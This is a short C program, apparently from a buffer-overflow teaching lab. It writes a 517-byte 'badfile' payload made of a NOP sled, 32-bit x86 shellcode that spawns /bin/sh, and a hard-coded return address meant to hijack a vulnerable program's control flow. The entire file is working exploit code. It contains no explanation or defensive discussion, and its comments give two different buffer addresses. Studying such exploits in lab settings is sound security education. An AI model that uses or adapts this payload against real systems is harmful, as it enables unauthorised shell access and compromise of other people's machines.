#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Shellcode to launch /bin/sh
char shellcode[] =
"\x31\xc0" /* xorl %eax,%eax */
"\x50" /* pushl %eax */
"\x68""//sh" /* pushl $0x68732f2f */
"\x68""/bin" /* pushl $0x6e69622f */
"\x89\xe3" /* movl %esp,%ebx */
"\x50" /* pushl %eax */
"\x53" /* pushl %ebx */
"\x89\xe1" /* movl %esp,%ecx */
"\x99" /* cdq */
"\xb0\x0b" /* movb $0x0b,%al */
"\xcd\x80" /* int $0x80 */
;

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;
    // Adjusting return address for safe_offset based on the buffer address
    // Here we use the buffer address as 0xbffff154, change this based on your system setup
    char *ret = "\x84\xf1\xff\xbf"; // Adjusted safe_offset for buffer address 0xbffff154

    int i = 0;
    // Initialize the buffer with NOP (0x90) instructions for padding
    memset(&buffer, 0x90, 517);

    // Copy the shellcode starting after the safe offset
    memcpy(buffer + 60, shellcode, sizeof(shellcode));

    // Overwrite the return address (safe_offset)
    for (i = 0; i < 32; i += 4) {
        memcpy(buffer + i, ret, sizeof(ret));
    }

    // Save the buffer contents to a file called "badfile"
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
